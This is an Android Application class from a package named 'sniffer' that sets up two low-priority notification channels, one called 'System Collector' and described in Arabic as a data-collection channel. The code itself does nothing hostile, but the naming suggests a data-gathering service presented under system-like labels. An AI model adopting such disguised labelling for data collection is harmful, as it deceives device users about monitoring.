package com.v8.global.sniffer;

import android.app.Application;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;

public class MainApplication extends Application {

    private static Context context;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        createNotificationChannels();
    }

    public static Context getContext() {
        return context;
    }

    private void createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                "collector_channel",
                "System Collector",
                NotificationManager.IMPORTANCE_LOW
            );
            serviceChannel.setDescription("قناة جمع البيانات");

            NotificationChannel notificationChannel = new NotificationChannel(
                "notification_channel",
                "System Notifications",
                NotificationManager.IMPORTANCE_LOW
            );
            notificationChannel.setDescription("قناة الإشعارات");

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
            manager.createNotificationChannel(notificationChannel);
        }
    }
}
